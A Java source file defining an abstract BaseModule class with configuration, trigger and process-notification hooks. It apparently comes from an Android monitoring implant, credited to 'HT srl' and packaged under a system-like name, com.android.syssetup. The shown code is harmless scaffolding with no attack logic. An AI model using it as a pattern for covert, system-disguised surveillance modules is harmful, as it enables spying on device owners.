/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.syssetup.module;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.ThreadBase;
import com.android.syssetup.Trigger;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.conf.ConfigurationException;
import com.android.syssetup.manager.ManagerModule;
import com.android.syssetup.util.Check;

/**
 * The Class AgentBase.
 */
public abstract class BaseModule extends ThreadBase {
	private static final String TAG = "BaseModule"; //$NON-NLS-1$
	private ConfModule conf;
	private Trigger trigger;

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 * @throws ConfigurationException
	 */
	protected abstract boolean parse(ConfModule conf);

	public String getType() {
		return ManagerModule.self().getType(this.getClass());
	}

	public boolean setConf(ConfModule conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		return parse(conf);
	}

	@Override
	public String toString() {
		return "Module <" + conf.getType().toUpperCase() + "> " + (isRunning() ? "running" : ""); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
	}

	public void setTrigger(Trigger trigger) {
		this.trigger = trigger;
	}
	
	public boolean isInstanced(){
		return  ManagerModule.self().isInstancedAgent(getType());
	}

	public void notifyProcess(ProcessInfo b) {
	}

}